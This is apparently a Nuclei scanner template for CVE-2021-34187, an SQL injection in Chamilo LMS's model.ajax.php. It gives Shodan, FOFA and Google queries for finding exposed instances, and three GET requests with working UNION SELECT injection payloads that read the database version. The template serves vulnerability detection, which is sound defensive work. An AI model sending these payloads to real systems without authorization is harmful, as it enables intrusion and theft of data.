id: CVE-2021-34187

info:
  name: Chamilo LMS SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: main/inc/ajax/model.ajax.php in Chamilo through 1.11.14 allows SQL Injection via the searchField, filters, or filters2 parameter.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version.
  reference:
    - https://murat.one/?p=118
    - https://github.com/20142995/Goby
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/HimmelAward/Goby_POC
    - https://github.com/Z0fhack/Goby_POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-34187
    cwe-id: CWE-89
    epss-score: 0.00639
    epss-percentile: 0.79815
    cpe: cpe:2.3:a:chamilo:chamilo:*:*:*:*:*:*:*:*
  metadata:
    vendor: chamilo
    product: chamilo
    shodan-query: http.component:"Chamilo"
    fofa-query: title="chamilo has not been installed"
    google-query: intitle:"chamilo has not been installed"

http:
  - method: GET
    path:
      - "{{BaseURL}}/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_search=1&searchField=1))and(1)%20UNION%20ALL%20SELECT%20CONCAT((select+version())),NULL,NULL,NULL--%20-)and((1=&searchOper=ni&searchString=testx&filters2={}&from_course_session=0"
      - "{{BaseURL}}/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_force_search=1&search=1&searchField=1&searchOper=ni&searchString=testx&filters={%22rules%22:[{%22field%22:%221))union%20select%20version(),2,3,4--%20-%22,%22op%22:%22in%22,%22data%22:%22test%22}],%22groupOp%22:%22and%22}&from_course_session=0"
      - "{{BaseURL}}/main/inc/ajax/model.ajax.php?a=get_sessions_tracking&work_id=1&rows=0&page=1&sidx=0&sord=test&_force_search=1&search=1&searchField=1&searchOper=ni&searchString=testx&filters2={%22rules%22:[{%22field%22:%221))union%20select%20version(),2,3,4--%20-%22,%22op%22:%22in%22,%22data%22:%22test%22}],%22groupOp%22:%22and%22}&from_course_session=0"

    matchers:
      - type: word
        words:
          - "MariaDB"
          - "version()"
        part: body
        condition: or
